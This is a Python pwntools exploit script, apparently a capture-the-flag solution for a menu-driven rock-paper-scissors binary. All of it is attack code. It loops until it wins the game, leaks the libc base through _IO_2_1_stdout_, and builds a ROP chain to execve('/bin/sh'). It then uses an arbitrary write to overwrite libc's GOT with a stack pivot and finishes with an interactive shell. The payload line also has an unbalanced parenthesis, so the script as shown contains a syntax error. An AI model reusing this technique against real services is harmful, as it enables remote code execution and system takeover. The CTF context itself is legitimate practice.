from pwn import *
context.arch='amd64'
p = remote('0.0.0.0', 1111)

libc = ELF("./libc.so.6")

def win():
	while 1:
		p.sendlineafter('> ', b'2')
		p.sendlineafter('> ', b'2')
		a = p.recvline()
		if (len(a) == 8):
			break

def rps(num = b'2'):
	win()
	p.sendlineafter('> ', b'0')
	p.sendlineafter('> ', num)

name = b'so2been'
p.sendafter('> ', name)

# libc base leak
rps(b'1')
for i in range(0, 4):
	rps()
win()
p.sendlineafter('> ', b'1')
p.sendlineafter("Name: ", b'0x210')
p.sendlineafter('> ', b'1')
p.recvuntil('so2\n')
base = int(p.readline(),16) - libc.symbols['_IO_2_1_stdout_']

# rop gadget
libc.address=base
rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi",'ret'])[0]
rsi = rop.find_gadget(["pop rsi",'ret'])[0]
rdx = rop.find_gadget(["pop rdx","pop r12",'ret'])[0]
rsp = rop.find_gadget(["pop rsp",'ret'])[0]
rop_chain = [rdi, next(libc.search(b"/bin/sh")), rsi, 0, rdx, 0, 0, libc.sym['execve']]

got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr

dest = got+8
payload = p64(dest+0x38*8) + p64(rsp) + p64(plt0) * 0x36 + flat(rop_chain))


# overwrite
p.sendlineafter('> ', b'1')
p.sendafter("Length: ", p64(len(payload)))
p.sendafter("Where: ", p64(dest))
p.sendlineafter("Name: ", payload)

p.interactive()
